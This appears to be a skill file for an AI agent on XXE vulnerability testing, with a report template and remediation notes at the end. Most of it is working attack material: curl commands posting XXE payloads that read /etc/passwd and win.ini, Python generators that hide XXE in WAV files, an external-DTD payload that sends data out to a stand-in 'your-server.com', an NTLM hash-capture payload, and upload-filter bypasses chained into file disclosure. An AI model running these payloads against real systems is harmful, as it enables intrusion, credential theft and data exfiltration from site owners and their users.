---
description: Find XXE vulnerabilities in web applications. Use when testing for XXE issues.
---

# XXE Vulnerability Testing Framework

## High-Value Target Patterns

### Common Vulnerable Endpoints
- `/api/*/xml*` - API endpoints processing XML
- `*dynamicpage*.aspx` - ASP.NET dynamic pages  
- `*xmlservice*.aspx` - XML service handlers
- `/api/sxmp/*` - SMS/messaging services
- File upload endpoints with XML processing
- Sitemap processors (`/sitemap`, `/audit`, `/crawl`)

### Vulnerable Parameters
- `_hxpage` - Page reference parameters
- `HX_PAGE_NAME` - Page name in POST data
- `operatorId`, `referenceId` - Business logic fields
- `allow_file_type_list` - File type restrictions
- Sitemap URL parameters

### Target File Extensions
- `.aspx`, `.jsp`, `.php` - Server-side processors
- `.xml`, `.xhtml`, `.svg` - XML-based formats
- `.wav`, `.mp3` - Media files with metadata

## Discovery Commands

```bash
# Find XML processing endpoints
curl -s "$TARGET" | grep -E "(xml|XML)" | grep -oE 'href="[^"]*xml[^"]*"'

# Discover ASP.NET XML handlers
curl -s "$TARGET/sitemap.xml" -w "%{http_code}" | grep -q "200"
find . -name "*.aspx" -exec grep -l "xml\|XML" {} \;

# Check for file upload endpoints
curl -s "$TARGET" | grep -iE "(upload|file)" | grep -oE 'action="[^"]*"'

# Test common XML service paths
for path in api/xml api/sxmp xmlservice dynamicpage; do
  curl -s -w "%{http_code} " "$TARGET/$path" | grep -v "404"
done
```

## Testing Methodology

### Step 1: Basic XXE Detection
```bash
# Create basic XXE payload
cat > xxe_basic.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY file SYSTEM "file:///etc/passwd"> 
]>
<root>&file;</root>
EOF

# Test against discovered endpoints
curl -X POST "$TARGET/api/xml" \
  -H "Content-Type: text/xml" \
  -d @xxe_basic.xml \
  --connect-timeout 10
```

### Step 2: Application-Specific Testing

#### ASP.NET Applications
```bash
# Test hxdynamicpage pattern
curl -X POST "$TARGET/hxdynamicpage6.aspx?_hxpage=test.xml" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "data=$(cat xxe_basic.xml | base64 -w 0)"

# Test xmlservice handler
curl -X POST "$TARGET/hxxmlservice6.aspx" \
  -H "Content-Type: text/xml" \
  -H "HX_PAGE_NAME: malicious.xml" \
  -d @xxe_basic.xml
```

#### SMS/Messaging APIs
```bash
# Create SXMP-specific payload
cat > xxe_sxmp.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY file SYSTEM "file:///etc/passwd"> 
]>
<operation type="deliver">
<account username="test" password="test"/>
<deliverRequest referenceId="REF123">
<operatorId>&file;</operatorId>
<sourceAddress type="network">40404</sourceAddress>
<destinationAddress type="international">123</destinationAddress>
<text encoding="ISO-8859-1">test</text>
</deliverRequest>
</operation>
EOF

curl -X POST "$TARGET/api/sxmp/1.0" \
  -H "Content-Type: text/xml" \
  -d @xxe_sxmp.xml
```

### Step 3: File Upload XXE
```bash
# Create malicious WAV file with XXE
python3 -c "
import struct
xxe_payload = b'''<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'''
wav_header = b'RIFF' + struct.pack('<I', len(xxe_payload) + 36) + b'WAVE'
with open('xxe.wav', 'wb') as f:
    f.write(wav_header + xxe_payload)
"

# Upload via multipart form
curl -X POST "$TARGET/upload" \
  -F "file=@xxe.wav;type=audio/wav" \
  -F "allow_file_type_list=wav;xml"
```

### Step 4: External Entity Detection
```bash
# Set up listener (requires your server)
YOUR_SERVER="http://your-server.com"
cat > xxe_external.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "$YOUR_SERVER/xxe-test" >
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <url>
        <loc>&xxe;</loc>
        <lastmod>2023-01-01</lastmod>
    </url>
</urlset>
EOF

# Test sitemap processors
curl -X POST "$TARGET/audit/sitemap" \
  -F "sitemap_url=$YOUR_SERVER/sitemap.xml"
```

## Advanced Payloads

### Directory Listing (Java)
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
```

### Windows File Access
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
```

### NTLM Hash Extraction
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "\\\\YOUR_SERVER\\share">]>
```

## Response Analysis

```bash
# Check for successful file disclosure
grep -E "(root:|bin/bash|daemon:|Windows|Program Files)" response.txt

# Detect error-based XXE
grep -iE "(unable to convert|parse error|xml|entity)" response.txt

# Check for SSRF indicators
grep -E "(connection|timeout|unreachable)" response.txt
```

## Upload Bypass Techniques

### File Type Restriction Bypass
```bash
# Method 1: Modify allow_file_type_list parameter
curl -X POST "$TARGET/upload" \
  -F "file=@malicious.xml;type=image/jpeg" \
  -F "allow_file_type_list=jpg;jpeg;xml;html"

# Method 2: Remove file type restrictions entirely
curl -X POST "$TARGET/upload" \
  -F "file=@malicious.xml;type=image/jpeg" \
  # Omit allow_file_type_list parameter

# Method 3: Double extension bypass
mv malicious.xml malicious.jpg.xml
curl -X POST "$TARGET/upload" \
  -F "file=@malicious.jpg.xml;type=image/jpeg"
```

### WAV File XXE Embedding
```python
# Advanced WAV file with embedded XXE
import struct

def create_xxe_wav(dtd_server):
    xxe_payload = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY % dtd SYSTEM "{dtd_server}/xxe.dtd">
   %dtd;
]>
<root>&send;</root>'''.encode()
    
    # Create minimal WAV structure
    wav_data = b'RIFF' + struct.pack('<I', len(xxe_payload) + 36) + b'WAVE'
    wav_data += b'fmt ' + struct.pack('<IHHIIHH', 16, 1, 1, 8000, 8000, 1, 8)
    wav_data += b'data' + struct.pack('<I', len(xxe_payload)) + xxe_payload
    
    with open('xxe.wav', 'wb') as f:
        f.write(wav_data)
```

## Platform-Specific Patterns

### Starbucks-style Upload Chain
```bash
# Step 1: Upload XML file with bypassed restrictions
curl -X POST "$TARGET/upload" \
  -F "file=@xxe.xml;type=image/jpeg;filename=test.jpg" \
  -F "allow_file_type_list=xml;jpg;jpeg;png;bmp" \
  -F "max_file_size_kb=1024"

# Step 2: Extract uploaded file path from response
UPLOAD_PATH=$(grep -oE 'temp_uploaded_[a-f0-9-]+\.xml' response.txt)

# Step 3: Trigger XXE via hxdynamicpage
curl -X POST "$TARGET/hxdynamicpage6.aspx?_hxpage=tempfiles/$UPLOAD_PATH" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### SXMP Error-Based Extraction
```bash
# Leverage SXMP error messages for data extraction
cat > sxmp_error.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<operation type="deliver">
<account username="abc" password="a"/>
<deliverRequest referenceId="MYREF102020022">
<operatorId>&file;</operatorId>
<sourceAddress type="network">40404</sourceAddress>
<destinationAddress type="international">123</destinationAddress>
<text encoding="ISO-8859-1">test</text>
</deliverRequest>
</operation>
EOF

# Look for "Unable to convert [FILE_CONTENT] to an integer" errors
curl -X POST "$TARGET/api/sxmp/1.0" \
  -H "Content-Type: text/xml" \
  -d @sxmp_error.xml | grep -A5 -B5 "Unable to convert"
```

## WordPress-Specific XXE (PHP 8)

### Detection Commands
```bash
# Check WordPress version and PHP version
curl -s "$TARGET/wp-admin/install.php" | grep -oE "Version [0-9]+\.[0-9]+"
curl -s "$TARGET/?p=1" -H "X-Original-URL: /wp-admin/admin-ajax.php" | grep -i "php"
```

### Exploitation
```bash
# Create malicious WAV for WordPress media library
python3 create_wp_xxe.py --server "http://your-server.com" --output wp_xxe.wav

# Upload via authenticated session (requires author+ privileges)
curl -X POST "$TARGET/wp-admin/async-upload.php" \
  -H "Cookie: wordpress_logged_in_xxxxx=..." \
  -F "file=@wp_xxe.wav" \
  -F "name=wp_xxe.wav" \
  -F "action=upload-attachment"
```

## Environment-Specific Indicators

### IIS/ASP.NET Environment
- Look for `hxdynamicpage*.aspx` patterns
- Test `HX_PAGE_NAME` header manipulation  
- Check for `xmlservice*.aspx` handlers
- NTLM hash extraction more likely to succeed

### Java Applications
- Directory listing via `file:///` 
- Cloudhopper SXMP servlet patterns
- Sitemap processing in audit tools
- Look for "Java/" user agents in external requests

### WordPress/PHP 8
- Media library upload functionality
- WAV file processing vulnerability
- Requires authenticated access (author+)
- libxml entity loader disabled check bypassed

## Severity Rating

| Impact | Conditions | Score |
|--------|------------|-------|
| **Critical** | RCE via Phar, credential files accessible | 9.0-10.0 |
| **High** | /etc/passwd, config files, SSRF to internal services | 7.0-8.9 |
| **Medium** | Limited file access, external network requests | 4.0-6.9 |
| **Low** | Error messages only, no file access | 1.0-3.9 |

## False Positives to Ignore

- XML parsing errors unrelated to entities
- Network timeouts without entity processing
- 403/404 responses to entity requests
- Generic "XML parsing failed" without disclosure
- Client-side XML processing only

## Finding Report Template

```markdown
# XXE Vulnerability in [Application/Endpoint]

## Summary
XML External Entity (XXE) vulnerability allows file disclosure and SSRF attacks.

## Vulnerable Endpoint
- **URL**: [TARGET_URL]
- **Method**: POST
- **Content-Type**: text/xml
- **Parameters**: [VULNERABLE_PARAMS]

## Proof of Concept
```bash
curl -X POST "[TARGET_URL]" \
  -H "Content-Type: text/xml" \
  -d '[XXE_PAYLOAD]'
```

**Response containing sensitive data**:
```
[SENSITIVE_OUTPUT]
```

## Impact
- [ ] Local file disclosure (/etc/passwd, config files)
- [ ] SSRF to internal services
- [ ] Information disclosure
- [ ] Potential RCE via Phar deserialization
- [ ] DoS via billion laughs attack

## Risk Rating
**[HIGH/CRITICAL]** - Severity score: [X.X]/10.0

## Remediation
1. Disable external entity processing
2. Use secure XML parsers with entity resolution disabled
3. Validate and sanitize XML input
4. Implement proper input filtering

## References
- OWASP XXE Prevention: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
```